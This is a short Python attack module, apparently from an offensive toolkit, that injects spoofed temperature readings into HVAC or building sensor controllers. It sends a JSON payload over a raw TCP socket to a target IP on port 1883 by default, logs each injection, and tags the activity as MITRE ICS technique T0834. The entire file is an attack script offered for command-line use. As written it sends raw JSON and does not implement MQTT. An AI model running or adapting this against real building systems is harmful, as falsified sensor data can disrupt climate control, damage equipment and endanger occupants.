#!/usr/bin/env python3
# modules/attacks/fake_temp_sensor_injector.py

import argparse
import socket
import json
import time
import os
from datetime import datetime

LOG_FILE = "results/fake_temp_sensor_log.json"
MITRE_TTP = "T0834"

def log_injection(ip, value):
    os.makedirs("results", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps({
            "timestamp": datetime.utcnow().isoformat(),
            "target_ip": ip,
            "spoofed_temp": value,
            "ttp": MITRE_TTP
        }) + "\n")

def inject_fake_temp(ip, port, value):
    try:
        s = socket.socket()
        s.connect((ip, port))
        payload = json.dumps({"sensor": "temperature", "value": value})
        s.sendall(payload.encode())
        s.close()
        log_injection(ip, value)
        print(f"[✓] Injected fake temp {value}°C to {ip}:{port}")
    except Exception as e:
        print(f"[!] Injection failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Inject fake temperature readings into building systems")
    parser.add_argument("--ip", required=True, help="Target IP of HVAC or sensor controller")
    parser.add_argument("--port", type=int, default=1883, help="Target port (default: 1883)")
    parser.add_argument("--value", type=float, required=True, help="Spoofed temperature value (e.g., 95.0)")
    args = parser.parse_args()

    inject_fake_temp(args.ip, args.port, args.value)
